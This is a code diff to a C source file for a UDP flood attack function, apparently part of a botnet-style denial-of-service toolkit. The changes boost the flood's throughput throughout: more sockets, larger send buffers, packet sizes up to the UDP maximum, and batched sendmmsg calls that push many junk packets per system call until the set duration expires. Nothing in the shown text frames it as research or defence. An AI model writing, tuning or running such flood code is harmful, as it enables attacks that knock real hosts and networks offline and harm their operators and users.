@@ -11,17 +11,18 @@
 #include "udpplain_attack.h"
 #include "../headers/protocol.h"
 
-#define UDP_PLAIN_SOCKS 128
+#define UDP_PLAIN_SOCKS 512
+#define BATCH 64
 
 void* udpplain_attack(void* arg) {
     attack_params* params = (attack_params*)arg;
     if (!params) return NULL;
 
     attack_option* opt_psize = find_option(params, OPT_PSIZE);
-    uint16_t psize = opt_psize ? get_option_u16(opt_psize) : 1450;
-    if (psize == 0 || psize > 1450) psize = 1450;
+    uint16_t psize = opt_psize ? get_option_u16(opt_psize) : 1400;
+    if (psize == 0 || psize > 65507) psize = 1400;
 
-    int sndbuf = 1024 * 1024;
+    int sndbuf = 4 * 1024 * 1024;
 
     int fds[UDP_PLAIN_SOCKS];
     int active = 0;
@@ -38,8 +39,24 @@ void* udpplain_attack(void* arg) {
     if (active == 0) return NULL;
 
     char *data = malloc(psize);
-    if (!data) return NULL;
+    if (!data) {
+        for (int i = 0; i < UDP_PLAIN_SOCKS; i++)
+            if (fds[i] != -1) close(fds[i]);
+        return NULL;
+    }
     memset(data, 0xFF, psize);
+
+    /* Pre-build sendmmsg batch — connected sockets need no destination */
+    struct mmsghdr msgs[BATCH];
+    struct iovec iovs[BATCH];
+
+    for (int i = 0; i < BATCH; i++) {
+        iovs[i].iov_base = data;
+        iovs[i].iov_len  = psize;
+        memset(&msgs[i], 0, sizeof(msgs[i]));
+        msgs[i].msg_hdr.msg_iov    = &iovs[i];
+        msgs[i].msg_hdr.msg_iovlen = 1;
+    }
 
     time_t end_time = time(NULL) + params->duration;
     uint64_t iter = 0;
@@ -47,9 +64,9 @@ void* udpplain_attack(void* arg) {
     while (params->active) {
         for (int i = 0; i < UDP_PLAIN_SOCKS; i++) {
             if (fds[i] == -1) continue;
-            send(fds[i], data, psize, MSG_NOSIGNAL);
+            sendmmsg(fds[i], msgs, BATCH, MSG_NOSIGNAL);
         }
-        // check time every 4096 iterations to avoid syscall overhead
+        /* check time every 4096 iterations to avoid syscall overhead */
         if ((++iter & 0xFFF) == 0 && time(NULL) >= end_time) break;
     }
 
